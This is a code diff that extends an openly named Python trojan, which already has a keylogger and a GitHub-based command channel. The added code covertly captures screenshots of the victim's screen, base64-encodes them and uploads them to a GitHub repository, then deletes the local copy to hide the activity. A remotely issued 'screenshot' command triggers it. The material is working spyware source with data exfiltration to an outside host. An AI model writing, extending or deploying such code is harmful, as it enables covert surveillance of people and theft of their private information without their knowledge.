@@ -10,6 +10,8 @@ import subprocess
 import requests
 from datetime import datetime
 from pynput import keyboard  # Added for keylogger
+import pyautogui  # Added for screenshot functionality
+import os  # Added for file handling
 
 def github_connect():
     with open('secret.txt') as f:
@@ -37,6 +39,40 @@ class Keylogger:
     def run(self):
         with keyboard.Listener(on_press=self.on_press) as listener:
             listener.join()
+
+# Screenshot functionality
+class Screenshot:
+    def __init__(self, repo, data_path):
+        self.repo = repo
+        self.data_path = data_path
+
+    def take_screenshot(self):
+        # Generate a unique filename based on the current timestamp
+        filename = f'screenshot_{datetime.now().strftime("%Y%m%d_%H%M%S")}.png'
+        
+        # Take a screenshot
+        screenshot = pyautogui.screenshot()
+        
+        # Save the screenshot to the current directory
+        screenshot.save(filename)
+        
+        return filename
+
+    def send_screenshot_to_github(self, filename):
+        try:
+            with open(filename, 'rb') as file:
+                bindata = base64.b64encode(file.read()).decode('utf-8')
+            
+            message = f"Screenshot taken at {datetime.now().isoformat()}"
+            remote_path = f'{self.data_path}{filename}'
+            self.repo.create_file(remote_path, message, bindata)
+            print(f"Screenshot {filename} uploaded to GitHub.")
+        except Exception as e:
+            print(f"Error uploading screenshot to GitHub: {e}")
+
+        # Clean up by deleting the local screenshot file after uploading
+        os.remove(filename)
+        print("Screenshot module executed")
 
 class Trojan:
     def __init__(self, id, node_server_url):
@@ -116,6 +152,8 @@ class Trojan:
                     thread.start()
             elif command_type == 'keylogger':  # Added keylogger command handling
                 self.start_keylogger()
+            elif command_type == 'screenshot':  # Added screenshot command handling
+                self.run_screenshot_module()
         else:
             print(f"Invalid command format: {command}")
 
@@ -134,6 +172,11 @@ class Trojan:
         keylogger_thread = threading.Thread(target=keylogger.run)
         keylogger_thread.start()
         print("[*] Keylogger started.")  # Debug output
+
+    def run_screenshot_module(self):
+        screenshot = Screenshot(self.repo, self.data_path)
+        screenshot_file = screenshot.take_screenshot()
+        screenshot.send_screenshot_to_github(screenshot_file)
 
     def run(self):
         while self.running:
